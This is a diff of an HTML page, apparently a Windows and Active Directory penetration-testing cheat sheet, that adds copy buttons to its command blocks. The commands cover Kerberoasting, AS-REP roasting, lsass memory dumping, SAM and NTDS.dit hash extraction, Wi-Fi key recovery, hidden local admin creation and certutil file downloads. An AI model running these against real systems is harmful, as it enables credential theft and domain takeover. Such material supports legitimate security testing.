@@ -435,43 +435,57 @@
 <h3 id="list-spn-accounts">List SPN accounts</h3>
 <p>An account can be used to executes features (Service) on a server. Theses features
 are calls SPNs and are represented as follow:</p>
-<pre><code class="language-none">service-class/hostname-FQDN(:port)(/arbitrary-name)
-</code></pre>
+<div class="clipboard-content">  <pre><code class="language-none">service-class/hostname-FQDN(:port)(/arbitrary-name)
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="service-class/hostname-FQDN(:port)(/arbitrary-name)
+">    Copy  </button></div></div>
 <p>More details are available on the <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc772815(v=ws.10)#service-principal-names" target="_blank">Microsoft documentation</a></p>
 <p>The following LDAP query lists the accounts with a SPN on the domain:</p>
-<pre><code class="language-ldap">&amp;(objectCategory=person)(objectClass=user)(servicePrincipalName=*)
-</code></pre>
+<div class="clipboard-content">  <pre><code class="language-ldap">&amp;(objectCategory=person)(objectClass=user)(servicePrincipalName=*)
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="&amp;(objectCategory=person)(objectClass=user)(servicePrincipalName=*)
+">    Copy  </button></div></div>
 <p>With Powershell, the script is the following:</p>
-<pre><code class="language-powershell">$users = (New-Object System.DirectoryServices.DirectorySearcher(&quot;(&amp;(objectCategory=person)(objectClass=user)(servicePrincipalName=*))&quot;)).FindAll()
-</code></pre>
+<div class="clipboard-content">  <pre><code class="language-powershell">$users = (New-Object System.DirectoryServices.DirectorySearcher(&quot;(&amp;(objectCategory=person)(objectClass=user)(servicePrincipalName=*))&quot;)).FindAll()
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="$users = (New-Object System.DirectoryServices.DirectorySearcher(&quot;(&amp;(objectCategory=person)(objectClass=user)(servicePrincipalName=*))&quot;)).FindAll()
+">    Copy  </button></div></div>
 <h3 id="kerberoast">Kerberoast</h3>
 <p>The Kerberoast attack consist on asking a TGS for a specific SPN then brute-force
 the hash to recover the account password.
 With the list of SPN account, the attacker is going to target accounts with
 privileges. The success of this attack depends on the company password policy.</p>
 <p><a href="https://github.com/GhostPack/Rubeus" target="_blank">Rubeus</a> dumps the hash of a target SPN account:</p>
-<pre><code class="language-bash">Rubeus.exe kerberoast /creduser:&quot;&lt;fqdn_dom&gt;\&lt;user&gt;&quot; /credpassword:&quot;&lt;password&gt;&quot; /domain:&quot;&lt;fqdn_dom&gt;&quot; /outfile:&quot;kerberoast.hash.txt&quot;
-</code></pre>
+<div class="clipboard-content">  <pre><code class="language-bash">Rubeus.exe kerberoast /creduser:&quot;&lt;fqdn_dom&gt;\&lt;user&gt;&quot; /credpassword:&quot;&lt;password&gt;&quot; /domain:&quot;&lt;fqdn_dom&gt;&quot; /outfile:&quot;kerberoast.hash.txt&quot;
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="Rubeus.exe kerberoast /creduser:&quot;&lt;fqdn_dom&gt;\&lt;user&gt;&quot; /credpassword:&quot;&lt;password&gt;&quot; /domain:&quot;&lt;fqdn_dom&gt;&quot; /outfile:&quot;kerberoast.hash.txt&quot;
+">    Copy  </button></div></div>
 <p>You can also use the <code>impacket</code> script <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py" target="_blank"><code>GetUserSPNs.py</code></a>
 to get the hash in a format that <code>John</code> or <code>Hashcat</code> can brute-force:</p>
-<pre><code class="language-bash">python GetUserSPNs.py &lt;domain_name&gt;/&lt;domain_user&gt;:&lt;domain_user_password&gt; -format &lt;john/empty&gt; -outputfile hashes.txt
-</code></pre>
+<div class="clipboard-content">  <pre><code class="language-bash">python GetUserSPNs.py &lt;domain_name&gt;/&lt;domain_user&gt;:&lt;domain_user_password&gt; -format &lt;john/empty&gt; -outputfile hashes.txt
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="python GetUserSPNs.py &lt;domain_name&gt;/&lt;domain_user&gt;:&lt;domain_user_password&gt; -format &lt;john/empty&gt; -outputfile hashes.txt
+">    Copy  </button></div></div>
 <h3 id="kerberosunconstraineddelegation">KerberosUnConstrainedDelegation</h3>
 <p>More information <a href="https://adsecurity.org/?p=1667" target="_blank">here</a></p>
-<pre><code class="language-powershell">$ Import-Module ActiveDirectory
+<div class="clipboard-content">  <pre><code class="language-powershell">$ Import-Module ActiveDirectory
 $ Get-ADComputer -Filter {(TrustedForDelegation -eq $True) -AND (PrimaryGroupID -eq 515)} -Properties 'TrustedForDelegation,TrustedToAuthForDelegation,servicePrincipalName,Description'
 
 # UserAccountControl &amp; 0x80000 (TRUSTED_FOR_DELEGATION)
 # UserAccountControl &amp; 0x100000 (TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION)
 $ $computers = (New-Object System.DirectoryServices.DirectorySearcher(&quot;(&amp;(objectCategory=Computer)(primaryGroupID=515)(useraccountcontrol:1.2.840.113556.1.4.804:=524288))&quot;)).FindAll().Properties
 $ foreach($c in $computers) { echo &quot;$($c.name) ($($c.useraccountcontrol))&quot; }
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="$ Import-Module ActiveDirectory
+$ Get-ADComputer -Filter {(TrustedForDelegation -eq $True) -AND (PrimaryGroupID -eq 515)} -Properties 'TrustedForDelegation,TrustedToAuthForDelegation,servicePrincipalName,Description'
+
+# UserAccountControl &amp; 0x80000 (TRUSTED_FOR_DELEGATION)
+# UserAccountControl &amp; 0x100000 (TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION)
+$ $computers = (New-Object System.DirectoryServices.DirectorySearcher(&quot;(&amp;(objectCategory=Computer)(primaryGroupID=515)(useraccountcontrol:1.2.840.113556.1.4.804:=524288))&quot;)).FindAll().Properties
+$ foreach($c in $computers) { echo &quot;$($c.name) ($($c.useraccountcontrol))&quot; }
+">    Copy  </button></div></div>
 <p>The website <a href="https://ldapwiki.com/wiki/" target="_blank">LdapWiki</a> explains how to write a LDAP query. For instance,
 if we want to use bitwise in ldap queries, we need to use some special arguments.</p>
 <p>There are two Bitwise operation Extensible Match Rules.</p>
-<pre><code class="language-none">1.2.840.113556.1.4.803 which is also referred to as LDAP_MATCHING_RULE_BIT_AND (Bitwise AND)
+<div class="clipboard-content">  <pre><code class="language-none">1.2.840.113556.1.4.803 which is also referred to as LDAP_MATCHING_RULE_BIT_AND (Bitwise AND)
 1.2.840.113556.1.4.804 which is also referred to as LDAP_MATCHING_RULE_BIT_OR (Bitwise OR)
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="1.2.840.113556.1.4.803 which is also referred to as LDAP_MATCHING_RULE_BIT_AND (Bitwise AND)
+1.2.840.113556.1.4.804 which is also referred to as LDAP_MATCHING_RULE_BIT_OR (Bitwise OR)
+">    Copy  </button></div></div>
 <p><img alt="" src="https://adsecurity.org/wp-content/uploads/2015/08/KerberosUnConstrainedDelegation-PowerShell-DiscoverServers2.png" /></p>
 <h3 id="kerberos-preauthentication">Kerberos preauthentication</h3>
 <p>A domain user can have the property "Do net required Kerberos preauthentication".
@@ -482,41 +496,51 @@ the user password. So the clear password can be retrieve with a brute-force atta
 <li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/445f7b2510c4553dcd9451bc4daccb20c8e67cbb/Recon/PowerView.ps1" target="_blank">Powerview</a> : <code>Get-DomainUser -PreauthNotRequired</code></li>
 <li>LDAP: <code>userAccountControl:1.2.840.113556.1.4.803:=4194304</code></li>
 </ul>
-<pre><code class="language-powershell">$users = (New-Object System.DirectoryServices.DirectorySearcher(&quot;(&amp;(objectCategory=User)(userAccountControl:1.2.840.113556.1.4.803:=4194304))&quot;)).FindAll()
-</code></pre>
+<div class="clipboard-content">  <pre><code class="language-powershell">$users = (New-Object System.DirectoryServices.DirectorySearcher(&quot;(&amp;(objectCategory=User)(userAccountControl:1.2.840.113556.1.4.803:=4194304))&quot;)).FindAll()
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="$users = (New-Object System.DirectoryServices.DirectorySearcher(&quot;(&amp;(objectCategory=User)(userAccountControl:1.2.840.113556.1.4.803:=4194304))&quot;)).FindAll()
+">    Copy  </button></div></div>
 <p>Then you can use the <code>impacket</code> script <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py" target="_blank"><code>GetNPUsers.py</code></a>
 to get the TGT in a format that <code>John</code> or <code>Hashcat</code> can brute-force:</p>
-<pre><code class="language-bash">python GetNPUsers.py &lt;domain&gt;/ -usersfile users.txt -format &lt;john/empty&gt; -outputfile hashes.txt
-</code></pre>
+<div class="clipboard-content">  <pre><code class="language-bash">python GetNPUsers.py &lt;domain&gt;/ -usersfile users.txt -format &lt;john/empty&gt; -outputfile hashes.txt
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="python GetNPUsers.py &lt;domain&gt;/ -usersfile users.txt -format &lt;john/empty&gt; -outputfile hashes.txt
+">    Copy  </button></div></div>
 <p>From <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py" target="_blank">@harmj0y</a>.</p>
 <h3 id="admincount-adminsdholder-sdprop">AdminCount, AdminSDHolder &amp; SDProp</h3>
 <p>The Security Descriptor propagator (<code>SDProp</code>) process runs every 60 minutes
 and re-sets the ACL of the protected objects with the security permissions set
 on the <code>AdminSDHolder</code> (check with ADExplorer).</p>
 <p>The objects protected by <code>AdminSDHolder</code>have the attribute <code>AdminCount</code> set to 1:</p>
-<pre><code class="language-powershell">$persons = (New-Object System.DirectoryServices.DirectorySearcher(&quot;(&amp;(admincount=1)(objectCategory=person))&quot;)).FindAll()
+<div class="clipboard-content">  <pre><code class="language-powershell">$persons = (New-Object System.DirectoryServices.DirectorySearcher(&quot;(&amp;(admincount=1)(objectCategory=person))&quot;)).FindAll()
 $groups = (New-Object System.DirectoryServices.DirectorySearcher(&quot;(&amp;(admincount=1)(objectCategory=group))&quot;)).FindAll()
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="$persons = (New-Object System.DirectoryServices.DirectorySearcher(&quot;(&amp;(admincount=1)(objectCategory=person))&quot;)).FindAll()
+$groups = (New-Object System.DirectoryServices.DirectorySearcher(&quot;(&amp;(admincount=1)(objectCategory=group))&quot;)).FindAll()
+">    Copy  </button></div></div>
 <p>It's possible to change the <code>SDProp</code> interval from 60 to 7200 seconds (one minute to two hours).
 You can also run the process manually.</p>
 <p>Source: <a href="https://adsecurity.org/?p=1906" target="_blank">https://adsecurity.org/?p=1906</a></p>
 <h3 id="truster-account">Truster Account</h3>
 <p>The <a href="https://www.sstic.org/media/SSTIC2014/SSTIC-actes/secrets_dauthentification_pisode_ii__kerberos_cont/SSTIC2014-Article-secrets_dauthentification_pisode_ii__kerberos_contre-attaque-bordes_2.pdf" target="_blank">PDF</a> from SSTIC 2014 describes trusts accounts on Windows:</p>
-<pre><code class="language-none">sAMAccountType: 805306370 = ( TRUST_ACCOUNT );
-</code></pre>
+<div class="clipboard-content">  <pre><code class="language-none">sAMAccountType: 805306370 = ( TRUST_ACCOUNT );
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="sAMAccountType: 805306370 = ( TRUST_ACCOUNT );
+">    Copy  </button></div></div>
 <h3 id="user-enumeration">User enumeration</h3>
 <h4 id="ldap-search">LDAP search</h4>
 <p>Here is two queries to fetch informations of a domain controller using LDAP:</p>
-<pre><code class="language-bash">ldapsearch -h &lt;host&gt; -x -s base namingcontexts
+<div class="clipboard-content">  <pre><code class="language-bash">ldapsearch -h &lt;host&gt; -x -s base namingcontexts
 ldapsearch -h &lt;host&gt; -x -b &quot;DC=xxx,DC=yyy&quot; '(objectClass=Person)' sAMAccountName
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="ldapsearch -h &lt;host&gt; -x -s base namingcontexts
+ldapsearch -h &lt;host&gt; -x -b &quot;DC=xxx,DC=yyy&quot; '(objectClass=Person)' sAMAccountName
+">    Copy  </button></div></div>
 <h4 id="rpcclient">RPCClient</h4>
 <p>If the NULL session is activated on the Windows domain, then you can list the users
 with <code>rpcclient</code>:</p>
-<pre><code class="language-bash">rpcclient -U '' &lt;host&gt;
+<div class="clipboard-content">  <pre><code class="language-bash">rpcclient -U '' &lt;host&gt;
 rpcclient $&gt; enumdomusers
 rpcclient $&gt; queryuser &lt;user&gt;
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="rpcclient -U '' &lt;host&gt;
+rpcclient $&gt; enumdomusers
+rpcclient $&gt; queryuser &lt;user&gt;
+">    Copy  </button></div></div>
 <h2 id="find-passwords">Find passwords</h2>
 <h3 id="decrypt-gpo-with-cpassword">Decrypt GPO with cpassword</h3>
 <p>Some <code>Group Policy Preferences</code> (GPP) GPO stored at <code>\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\</code>
@@ -540,78 +564,112 @@ and the protection (<a href="https://support.microsoft.com/en-us/help/2962486/ms
 </ul>
 <p>To prevent an Administrator to dump <code>lsass</code> you can enable <a href="https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection" target="_blank">LSA Protection (<code>RunAsPPL</code>)</a>.</p>
 <h4 id="procdump">Procdump</h4>
-<pre><code class="language-bash">procdump -accepteula -ma lsass.exe lsass.dmp
-</code></pre>
+<div class="clipboard-content">  <pre><code class="language-bash">procdump -accepteula -ma lsass.exe lsass.dmp
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="procdump -accepteula -ma lsass.exe lsass.dmp
+">    Copy  </button></div></div>
 <h4 id="rundll32-comsvcsdll">Rundll32 &amp; comsvcs.dll</h4>
 <p>You need to get the PID of <code>lsass</code> before dumping it.</p>
-<pre><code class="language-bash">tasklist /fi &quot;imagename eq lsass.exe&quot;
+<div class="clipboard-content">  <pre><code class="language-bash">tasklist /fi &quot;imagename eq lsass.exe&quot;
 rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump &lt;PID&gt; lsass.dmp full
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="tasklist /fi &quot;imagename eq lsass.exe&quot;
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump &lt;PID&gt; lsass.dmp full
+">    Copy  </button></div></div>
 <h4 id="sqldumper">SQLDumper</h4>
 <p>You need to get the PID of <code>lsass</code> before dumping it. The tool can be found in
 one of the following path:</p>
-<pre><code class="language-none">C:\Program Files\Microsoft SQL Server\90\Shared\SQLDumper.exe
+<div class="clipboard-content">  <pre><code class="language-none">C:\Program Files\Microsoft SQL Server\90\Shared\SQLDumper.exe
 C:\Program Files (x86)\Microsoft Office\root\vfs\ProgramFilesX86\Microsoft Analysis\AS OLEDB\140\SQLDumper.exe
-</code></pre>
-<pre><code class="language-bash">sqldumper.exe &lt;PID&gt; 0 0x01100:40
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="C:\Program Files\Microsoft SQL Server\90\Shared\SQLDumper.exe
+C:\Program Files (x86)\Microsoft Office\root\vfs\ProgramFilesX86\Microsoft Analysis\AS OLEDB\140\SQLDumper.exe
+">    Copy  </button></div></div>
+<div class="clipboard-content">  <pre><code class="language-bash">sqldumper.exe &lt;PID&gt; 0 0x01100:40
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="sqldumper.exe &lt;PID&gt; 0 0x01100:40
+">    Copy  </button></div></div>
 <h3 id="sam-and-system-backup">SAM and SYSTEM backup</h3>
-<pre><code class="language-bash">$ reg save HKLM\SYSTEM SystemBkup.hiv
+<div class="clipboard-content">  <pre><code class="language-bash">$ reg save HKLM\SYSTEM SystemBkup.hiv
 $ reg save HKLM\SAM SamBkup.hiv
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="$ reg save HKLM\SYSTEM SystemBkup.hiv
+$ reg save HKLM\SAM SamBkup.hiv
+">    Copy  </button></div></div>
 <p>Then with <code>mimikatz</code> you can recover the hashes:</p>
-<pre><code class="language-bash">$ lsadump::sam /system:SystemBkup.hiv /sam:SamBkup.hiv
-</code></pre>
+<div class="clipboard-content">  <pre><code class="language-bash">$ lsadump::sam /system:SystemBkup.hiv /sam:SamBkup.hiv
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="$ lsadump::sam /system:SystemBkup.hiv /sam:SamBkup.hiv
+">    Copy  </button></div></div>
 <h3 id="calculate-ntlm-hash">Calculate NTLM hash</h3>
-<pre><code class="language-python">import hashlib
+<div class="clipboard-content">  <pre><code class="language-python">import hashlib
 pwd = &quot;password&quot;
 print(hashlib.new('md4', pwd.encode('utf-16le')).hexdigest())
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="import hashlib
+pwd = &quot;password&quot;
+print(hashlib.new('md4', pwd.encode('utf-16le')).hexdigest())
+">    Copy  </button></div></div>
 <h3 id="list-wifi-networks-and-password">List Wifi networks and password</h3>
-<pre><code class="language-bash">$ netsh wlan show profile
+<div class="clipboard-content">  <pre><code class="language-bash">$ netsh wlan show profile
 $ netsh wlan show profile &lt;WiFi name&gt; key=clear
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="$ netsh wlan show profile
+$ netsh wlan show profile &lt;WiFi name&gt; key=clear
+">    Copy  </button></div></div>
 <h3 id="extract-ntds-from-a-domain-controller">Extract NTDS from a domain controller</h3>
 <p>On a DC, open a cmd shell:</p>
-<pre><code class="language-batch">ntdsutil
+<div class="clipboard-content">  <pre><code class="language-batch">ntdsutil
 activate instance ntds
 ifm
 create full C:\ntds.dit
 quit
 quit
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="ntdsutil
+activate instance ntds
+ifm
+create full C:\ntds.dit
+quit
+quit
+">    Copy  </button></div></div>
 <p>If you have a remote shell, you can also use the one-liner:</p>
-<pre><code class="language-batch">ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full C:\ntds.dit&quot; q q
-</code></pre>
+<div class="clipboard-content">  <pre><code class="language-batch">ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full C:\ntds.dit&quot; q q
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full C:\ntds.dit&quot; q q
+">    Copy  </button></div></div>
 <p>On your machine, use <code>impacket</code> to recover the hashes:</p>
-<pre><code class="language-bash">python secretsdump.py -ntds &lt;ntds.dit&gt; -system &lt;SYSTEM&gt; LOCAL -outputfile &lt;output&gt; -pwd-last-set -user-status -history
-</code></pre>
+<div class="clipboard-content">  <pre><code class="language-bash">python secretsdump.py -ntds &lt;ntds.dit&gt; -system &lt;SYSTEM&gt; LOCAL -outputfile &lt;output&gt; -pwd-last-set -user-status -history
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="python secretsdump.py -ntds &lt;ntds.dit&gt; -system &lt;SYSTEM&gt; LOCAL -outputfile &lt;output&gt; -pwd-last-set -user-status -history
+">    Copy  </button></div></div>
 <h2 id="miscs">Miscs</h2>
 <h3 id="use-win32-api-in-python">Use Win32 API in Python</h3>
 <p>Download then install the pip package <code>pywin32</code> here: <a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/#pywin32" target="_blank">https://www.lfd.uci.edu/~gohlke/pythonlibs/#pywin32</a></p>
 <h3 id="get-ntp-configuration-server">Get NTP configuration server</h3>
-<pre><code class="language-bash">$ w32tm /query /status
-</code></pre>
+<div class="clipboard-content">  <pre><code class="language-bash">$ w32tm /query /status
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="$ w32tm /query /status
+">    Copy  </button></div></div>
 <h3 id="windows-10-versions">Windows 10 versions</h3>
 <p><a href="https://docs.microsoft.com/fr-fr/windows/release-information/" target="_blank">Release Informations</a></p>
 <h3 id="compile-net-without-visual-studio">Compile .Net without Visual Studio</h3>
-<pre><code class="language-bash">cd \Windows\Microsoft.NET\Framework\v4*
+<div class="clipboard-content">  <pre><code class="language-bash">cd \Windows\Microsoft.NET\Framework\v4*
 msbuild &quot;path\to\SharpUp-master\SharpUp.sln&quot; /t:Rebuild /p:Configuration=Release /p:Platform=&quot;Any CPU&quot;
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="cd \Windows\Microsoft.NET\Framework\v4*
+msbuild &quot;path\to\SharpUp-master\SharpUp.sln&quot; /t:Rebuild /p:Configuration=Release /p:Platform=&quot;Any CPU&quot;
+">    Copy  </button></div></div>
 <p>Or to compile a single file:</p>
-<pre><code class="language-bash">cd \Windows\Microsoft.NET\Framework\v4*
+<div class="clipboard-content">  <pre><code class="language-bash">cd \Windows\Microsoft.NET\Framework\v4*
 csc.exe /t:exe /out:path\to\main.exe path\to\main.cs
-</code></pre>
-<pre><code class="language-csharp">using System;
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="cd \Windows\Microsoft.NET\Framework\v4*
+csc.exe /t:exe /out:path\to\main.exe path\to\main.cs
+">    Copy  </button></div></div>
+<div class="clipboard-content">  <pre><code class="language-csharp">using System;
 
 public class HelloWorld {
     public static void Main() {
         Console.WriteLine(&quot;Hello world!&quot;);
     }
 }
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="using System;
+
+public class HelloWorld {
+    public static void Main() {
+        Console.WriteLine(&quot;Hello world!&quot;);
+    }
+}
+">    Copy  </button></div></div>
 <h3 id="basic-service-in-c">Basic Service in C#</h3>
-<pre><code class="language-csharp">using System.Diagnostics;
+<div class="clipboard-content">  <pre><code class="language-csharp">using System.Diagnostics;
 using System.ServiceProcess;
 
 namespace MyService {
@@ -623,53 +681,80 @@ namespace MyService {
 
     static class Program { static void Main() { ServiceBase.Run(new ServiceBase[] { new Service() } ); }}
 }
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="using System.Diagnostics;
+using System.ServiceProcess;
+
+namespace MyService {
+    public class Service:ServiceBase {
+        protected override void OnStart(string[] args) {
+            Process.Start(@&quot;C:\Windows\System32\cmd.exe&quot;, @&quot;/C &quot;&quot;&lt;cmd&gt;&quot;&quot;&quot;);
+        }
+    }
+
+    static class Program { static void Main() { ServiceBase.Run(new ServiceBase[] { new Service() } ); }}
+}
+">    Copy  </button></div></div>
 <h3 id="cmd-hijack">Cmd Hijack</h3>
 <p>You can confuse the <code>cmd.exe</code> binary with a directory traversal:</p>
-<pre><code class="language-bash">cmd.exe /c &quot;ping 127.0.0.1/../../../../../../../../../../windows/system32/calc.exe&quot;
-</code></pre>
+<div class="clipboard-content">  <pre><code class="language-bash">cmd.exe /c &quot;ping 127.0.0.1/../../../../../../../../../../windows/system32/calc.exe&quot;
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="cmd.exe /c &quot;ping 127.0.0.1/../../../../../../../../../../windows/system32/calc.exe&quot;
+">    Copy  </button></div></div>
 <p>Using this, you can hijack an argument such as a IP address in the ping call to
 execute an other binary.
 <a href="https://hackingiscool.pl/cmdhijack-command-argument-confusion-with-path-traversal-in-cmd-exe/" target="_blank">Julian Horoszkiewicz explains the details on his blog</a></p>
 <h3 id="tcp-dump-with-netsh">TCP dump with netsh</h3>
 <p>You can use <code>netsh trace</code> to dump TCP connexions on a Windows system. The following
 command start a service that dump the packets:</p>
-<pre><code class="language-bash">$ netsh trace start scenario=NetConnection capture=yes report=yes persistent=no maxsize=1024 correlation=yes traceFile=C:\Temp\NetTrace.etl
-</code></pre>
+<div class="clipboard-content">  <pre><code class="language-bash">$ netsh trace start scenario=NetConnection capture=yes report=yes persistent=no maxsize=1024 correlation=yes traceFile=C:\Temp\NetTrace.etl
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="$ netsh trace start scenario=NetConnection capture=yes report=yes persistent=no maxsize=1024 correlation=yes traceFile=C:\Temp\NetTrace.etl
+">    Copy  </button></div></div>
 <p>To start to service, you need to type:</p>
-<pre><code class="language-bash">$ netsh trace stop
-</code></pre>
+<div class="clipboard-content">  <pre><code class="language-bash">$ netsh trace stop
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="$ netsh trace stop
+">    Copy  </button></div></div>
 <p>When the service is stopped, it create an <code>etl</code> file (and a <code>cab</code> for the report)
 that contains the packets. To import it to Wireshark, you need to convert the file
 to a <code>pcap</code> file. The tool <code>etl2pcapng</code> can be used to convert the file. It's
 available on <a href="https://github.com/microsoft/etl2pcapng" target="_blank">Github</a>.</p>
-<pre><code class="language-bash">$ etl2pcapng.exe NetTrace.etl  NetTrace.pcapng
+<div class="clipboard-content">  <pre><code class="language-bash">$ etl2pcapng.exe NetTrace.etl  NetTrace.pcapng
 IF: medium=eth  ID=0    IfIndex=13
 Converted 3948 frames
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="$ etl2pcapng.exe NetTrace.etl  NetTrace.pcapng
+IF: medium=eth  ID=0    IfIndex=13
+Converted 3948 frames
+">    Copy  </button></div></div>
 <h3 id="add-user-to-local-admin">Add user to local admin</h3>
-<pre><code class="language-bash"># create a local user. End the username with a `$` to create a hidden local account
+<div class="clipboard-content">  <pre><code class="language-bash"># create a local user. End the username with a `$` to create a hidden local account
 net user &lt;username&gt; &lt;password&gt; /add
 # add user to local admin group, if the user is from a domain then use &lt;domain&gt;\&lt;username&gt;
 net localgroup Administrators &lt;username&gt; /add
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="# create a local user. End the username with a `$` to create a hidden local account
+net user &lt;username&gt; &lt;password&gt; /add
+# add user to local admin group, if the user is from a domain then use &lt;domain&gt;\&lt;username&gt;
+net localgroup Administrators &lt;username&gt; /add
+">    Copy  </button></div></div>
 <h3 id="extract-microsoft-update-files">Extract Microsoft Update files</h3>
 <p>A Windows Update is a <code>.msu</code> archive that contains a <code>.cab</code> archive. This file
 contains the new binaries (<code>.dll</code>, <code>.exe</code>, ...). To extract the two archive you
 can use the <code>expand</code> command:</p>
-<pre><code class="language-bash">expand -f:* &quot;update.msu&quot; &quot;%temp%\\update.msu&quot;
+<div class="clipboard-content">  <pre><code class="language-bash">expand -f:* &quot;update.msu&quot; &quot;%temp%\\update.msu&quot;
 expand -f:* &quot;%temp%\\update.msu\\update.cab&quot; &quot;%temp%\\update.msu\\update.cab&quot;
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="expand -f:* &quot;update.msu&quot; &quot;%temp%\\update.msu&quot;
+expand -f:* &quot;%temp%\\update.msu\\update.cab&quot; &quot;%temp%\\update.msu\\update.cab&quot;
+">    Copy  </button></div></div>
 <h3 id="download-file-with-certutil">Download file with certutil</h3>
 <p><code>certutil</code> is a useful tool to encode/decode and hash files. You can also
 download files with the following command:</p>
-<pre><code class="language-bash">certutil -urlcache -split -f &quot;{URL}&quot;
-</code></pre>
+<div class="clipboard-content">  <pre><code class="language-bash">certutil -urlcache -split -f &quot;{URL}&quot;
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="certutil -urlcache -split -f &quot;{URL}&quot;
+">    Copy  </button></div></div>
 <p>In your current directory there will be downloaded file. Be aware that there is
 cached files of the process in the two directories:</p>
-<pre><code class="language-none">%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content
+<div class="clipboard-content">  <pre><code class="language-none">%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content
 %USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content
+%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData
+">    Copy  </button></div></div>
             
           </div>
           <footer>
